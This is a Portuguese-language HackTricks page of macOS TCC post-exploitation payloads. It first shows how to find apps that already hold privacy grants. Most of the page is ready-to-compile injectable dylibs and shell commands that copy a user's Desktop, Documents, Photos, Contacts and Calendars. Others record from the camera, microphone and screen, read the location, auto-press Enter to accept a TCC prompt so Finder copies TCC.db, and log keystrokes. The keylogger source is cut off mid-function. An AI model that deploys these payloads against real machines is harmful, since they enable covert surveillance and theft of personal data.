# Payloads do TCC do macOS

{{#include ../../../../banners/hacktricks-training.md}}

> [!TIP]
> As decisões do TCC estão vinculadas à **identidade do processo** que solicita o recurso. Em post-exploitation, o objetivo habitual é **injetar esses payloads em um app já aprovado** (ou executá-los de outra forma no bundle / contexto de assinatura dele), em vez de executar um novo helper que acionará seu próprio prompt.
>
> Para **Screen Recording**, **Input Monitoring** e **synthetic input**, o macOS moderno também expõe APIs explícitas de preflight / request, como `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` e `CGRequestPostEventAccess`.

> [!WARNING]
> Este ainda é um caminho de ataque muito realista: pesquisas recentes sobre roubo de permissões em apps da Microsoft para macOS mostraram que **validação fraca de bibliotecas / carregamento de plugins** pode permitir que um atacante reutilize as permissões de TCC já concedidas ao app vítima para **câmera**, **microfone** e outros recursos, sem um segundo prompt.<sup>[[1]](#references)</sup>

## Triagem rápida antes de usar um payload

Pesquisas recentes sobre roubo de permissões continuam reforçando o mesmo workflow: primeiro encontre um app que já tenha a concessão de TCC desejada e, em seguida, verifique se ele é um alvo de injeção realista.<sup>[[1]](#references)</sup>
```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
"select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"

codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
egrep 'disable-library-validation|allow-dyld-environment-variables'
```
Se o target também carregar plug-ins / frameworks controlados pelo atacante, esses payloads se tornam muito mais interessantes. Para obter ideias mais amplas de post-exploitation após entrar em um processo já aprovado, confira [esta página relacionada](macos-tcc-credential-and-data-theft.md).

### Área de Trabalho

- **Entitlement**: Nenhum
- **TCC**: kTCCServiceSystemPolicyDesktopFolder

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copiar `$HOME/Desktop` para `/tmp/desktop`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
NSString *tmpPhotosPath = @"/tmp/desktop";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copie `$HOME/Desktop` para `/tmp/desktop`.
```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```
{{#endtab}}
{{#endtabs}}

### Documentos

- **Entitlement**: None
- **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copiar `$HOME/Documents` para `/tmp/documents`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
NSString *tmpPhotosPath = @"/tmp/documents";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copie `$HOME/`Documents para `/tmp/documents`.
```bash
cp -r "$HOME/Documents" "/tmp/documents"
```
{{#endtab}}
{{#endtabs}}

### Downloads

- **Entitlement**: Nenhum
- **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copiar `$HOME/Downloads` para `/tmp/downloads`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
NSString *tmpPhotosPath = @"/tmp/downloads";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copiar `$HOME/Downloads` para `/tmp/downloads`.
```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```
{{#endtab}}
{{#endtabs}}

### Biblioteca de Fotos

- **Entitlement**: `com.apple.security.personal-information.photos-library`
- **TCC**: `kTCCServicePhotos`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copie `$HOME/Pictures/Photos Library.photoslibrary` para `/tmp/photos`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
NSString *tmpPhotosPath = @"/tmp/photos";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copie `$HOME/Pictures/Photos Library.photoslibrary` para `/tmp/photos`.
```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```
{{#endtab}}
{{#endtabs}}

### Contatos

- **Entitlement**: `com.apple.security.personal-information.addressbook`
- **TCC**: `kTCCServiceAddressBook`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copie `$HOME/Library/Application Support/AddressBook` para `/tmp/contacts`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
NSString *tmpPhotosPath = @"/tmp/contacts";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copie `$HOME/Library/Application Support/AddressBook` para `/tmp/contacts`.
```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```
{{#endtab}}
{{#endtabs}}

### Calendário

- **Entitlement**: `com.apple.security.personal-information.calendars`
- **TCC**: `kTCCServiceCalendar`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Copie `$HOME/Library/Calendars` para `/tmp/calendars`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
NSString *tmpPhotosPath = @"/tmp/calendars";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copie `$HOME/Library/Calendars` para `/tmp/calendars`.
```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```
{{#endtab}}
{{#endtabs}}

### Câmera

- **Entitlement**: `com.apple.security.device.camera`
- **TCC**: `kTCCServiceCamera`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Grave um vídeo de 3 segundos e salve-o em **`/tmp/recording.mov`**<sup>[[5]](#references)</sup>.
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}
- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
NSError *error;
self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
if (error) {
NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
return;
}
if ([self.captureSession canAddInput:self.videoDeviceInput]) {
[self.captureSession addInput:self.videoDeviceInput];
}
self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([self.captureSession canAddOutput:self.movieFileOutput]) {
[self.captureSession addOutput:self.movieFileOutput];
}
}
- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = @"/tmp/recording.mov";
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}
- (void)stopRecording {
[self.movieFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
[videoRecorder startRecording];
[NSThread sleepForTimeInterval:3.0];
[videoRecorder stopRecording];
[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Verifique se o programa tem acesso à câmera.<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end
@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to camera granted.");
return YES;
} else {
NSLog(@"[-] Access to camera denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
[CameraAccessChecker hasCameraAccess];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Acione o prompt da câmera se o processo atual ainda estiver como `NotDetermined`.<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void camprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Tire uma foto com a câmera
```bash
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```
{{#endtab}}
{{#endtabs}}

### Microfone

- **Entitlement**: **com.apple.security.device.audio-input**
- **TCC**: `kTCCServiceMicrophone`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Grave 5s de áudio e armazene-o em `/tmp/recording.m4a`<sup>[[6]](#references)</sup>.
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}

- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
NSError *error;
self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];

if (error) {
NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
return;
}

if ([self.captureSession canAddInput:self.audioDeviceInput]) {
[self.captureSession addInput:self.audioDeviceInput];
}

self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

if ([self.captureSession canAddOutput:self.audioFileOutput]) {
[self.captureSession addOutput:self.audioFileOutput];
}
}

- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}

- (void)stopRecording {
[self.audioFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
NSLog(@"Saved to %@", outputFileURL.path);
}

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {

freopen("/tmp/logs.txt", "a", stderr);
AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

[audioRecorder startRecording];
[NSThread sleepForTimeInterval:5.0];
[audioRecorder stopRecording];

[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Verifique se o app tem acesso ao microfone.<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end
@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to microphone granted.");
return YES;
} else {
NSLog(@"[-] Access to microphone denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
[MicrophoneAccessChecker hasMicrophoneAccess];
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Acione o prompt do microfone se o processo atual ainda estiver `NotDetermined`.<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void micprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Grave um áudio de 5s e armazene-o em `/tmp/recording.wav`
```bash
# Check the microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Use microphone from index 1 from the previous list to record
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```
{{#endtab}}
{{#endtabs}}

### Localização

> [!TIP]
> Para que um app obtenha a localização, os **Serviços de Localização** (em Privacidade e Segurança) **devem estar ativados**; caso contrário, ele não poderá acessá-la.

- **Entitlement**: `com.apple.security.personal-information.location`
- **TCC**: Concedido em `/var/db/locationd/clients.plist`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Escreva a localização em `/tmp/logs.txt`
```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *location = [locations lastObject];
NSLog(@"Current location: %@", location);
exit(0); // Exit the program after receiving the first location update
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
NSLog(@"Error getting location: %@", error);
exit(1); // Exit the program on error
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSLog(@"Getting location");
CLLocationManager *locationManager = [[CLLocationManager alloc] init];
LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
locationManager.delegate = delegate;

[locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
[locationManager startUpdatingLocation];

NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
while (true) {
[runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}

NSLog(@"Location completed successfully.");
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="Shell"}}
Obtenha a localização atual a partir do shell.<sup>[[2]](#references)</sup>
```bash
# Fast option: use a dedicated CoreLocation CLI helper
brew install --cask corelocationcli
CoreLocationCLI --json

# Keep printing updates while the device moves
CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
```
> [!TIP]
> Isso ainda depende de os **Location Services** estarem ativados e de a ferramenta / o terminal obter aprovação do TCC. O `CoreLocationCLI` também depende do posicionamento assistido por Wi-Fi na maioria dos Macs, portanto manter o Wi-Fi desativado geralmente resulta em `kCLErrorDomain error 0`.

{{#endtab}}
{{#endtabs}}

### Gravação de tela

- **Entitlement**: None
- **TCC**: `kTCCServiceScreenCapture`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Grave a tela principal por 5s em `/tmp/screen.mov`
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)output
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording error: %@", error);
} else {
NSLog(@"Recording finished successfully.");
}
exit(0);
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
if ([captureSession canAddInput:screenInput]) {
[captureSession addInput:screenInput];
}

AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([captureSession canAddOutput:fileOutput]) {
[captureSession addOutput:fileOutput];
}

[captureSession startRunning];

MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
[fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];

// Run the loop for 5 seconds to capture
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
[fileOutput stopRecording];
});

CFRunLoopRun();
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check / Prompt"}}
Verifica se o processo atual pode capturar a tela e aciona o prompt do TCC, se necessário.
```objectivec
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>

// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib

__attribute__((constructor))
static void screencheck(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
BOOL allowed = CGPreflightScreenCaptureAccess();
if (!allowed) {
allowed = CGRequestScreenCaptureAccess();
}
NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
fclose(stderr);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Grave a tela principal por 5 s
```bash
screencapture -V 5 /tmp/screen.mov
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> No **macOS 12.3+**, `ScreenCaptureKit` geralmente é uma primitive de post-exploitation melhor que `AVCaptureScreenInput`: ela pode realizar streaming de alto desempenho, capturas de quadro único com `SCScreenshotManager` e transmitir **áudio do sistema**. Atualizações recentes do `ScreenCaptureKit` também adicionaram `captureMicrophone` / `microphoneCaptureDeviceID` a `SCStreamConfiguration`, além de `SCRecordingOutput` para gravação direta em arquivo; assim, um cliente de captura de tela hijacked pode salvar diretamente a tela + o áudio do sistema e adicionar o áudio do microfone quando o processo também possui `kTCCServiceMicrophone`.<sup>[[4]](#references)</sup> Para obter mais primitives de abuso da sessão da área de trabalho, consulte [esta página relacionada](../macos-input-monitoring-screen-capture-accessibility.md).

### Acessibilidade

- **Entitlement**: Nenhum
- **TCC**: `kTCCServiceAccessibility`

Use o privilégio TCC para aceitar o controle do Finder pressionando Enter e contornar o TCC dessa forma

{{#tabs}}
{{#tab name="Accept TCC"}}
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears

void SimulateKeyPress(CGKeyCode keyCode) {
CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
CGEventPost(kCGHIDEventTap, keyDownEvent);
CGEventPost(kCGHIDEventTap, keyUpEvent);
if (keyDownEvent) CFRelease(keyDownEvent);
if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
NSLog(@"Starting AppleScript");
NSString *scriptSource = @"tell application \"Finder\"\n"
"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
"set targetFolder to POSIX file \"/tmp\" as alias\n"
"duplicate file sourceFile to targetFolder with replacing\n"
"end tell\n";

NSDictionary *errorDict = nil;
NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
[appleScript executeAndReturnError:&errorDict];

if (errorDict) {
NSLog(@"AppleScript Error: %@", errorDict);
}
}

int main() {
@autoreleasepool {
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
RunAppleScript();
});

// Simulate pressing the Enter key every 0.1 seconds
NSLog(@"Starting key presses");
for (int i = 0; i < 10; ++i) {
SimulateKeyPress((CGKeyCode)36); // Key code for Enter
usleep(100000); // 0.1 seconds
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="Check / Prompt"}}
Verifique se o processo atual já é confiável para Acessibilidade e peça ao macOS para exibir a interface de consentimento caso não seja.
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
__attribute__((constructor))
static void axprompt(int argc, const char **argv) {
NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
}
```
{{#endtab}}

{{#tab name="Keylogger"}}
Armazene as teclas pressionadas em **`/tmp/keystrokes.txt`**
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
if (fileHandle) {
[fileHandle seekToEndOfFile];
[fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
[fileHandle closeFile];
} else {
// If the file does not exist, create it
[str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
if (type == kCGEventKeyDown) {
CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

NSString *keyString = nil;
// First, handle special non-printable keys
switch (keyCode) {
case kVK_Return: keyString = @"<Return>"; break;
case kVK_Tab: keyString = @"<Tab>"; break;
case kVK_Space: keyString = @"<Space>"; break;
case kVK_Delete: keyString = @"<Delete>"; break;
case kVK_Escape: keyString = @"<Escape>"; break;
case kVK_Command: keyString = @"<Command>"; break;
case kVK_Shift: keyString = @"<Shift>"; break;
case kVK_CapsLock: keyString = @"<CapsLock>"; break;
case kVK_Option: keyString = @"<Option>"; break;
case kVK_Control: keyString = @"<Control>"; break;
case kVK_RightControl: keyString = @"<Control>"; break;
case kVK_RightShift: keyString = @"<Shift>"; break;
case kVK_RightOption: keyString = @"<Option>"; break;
case kVK_Function: keyString = @"<Function>"; break;
case kVK_F1: keyString = @"<F1>"; break;
case kVK_F2: keyString = @"<F2>"; break;
case kVK_F3: keyString = @"<F3>"; break;
// Add more cases here for other non-printable keys...
default: break; // Not a special non-printable key
}

// If it's not a special key, try to translate it
if (!keyString) {
UniCharCount maxStringLength = 4;
UniCharCount actualStringLength = 0;
UniChar unicodeString[maxStringLength];

TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
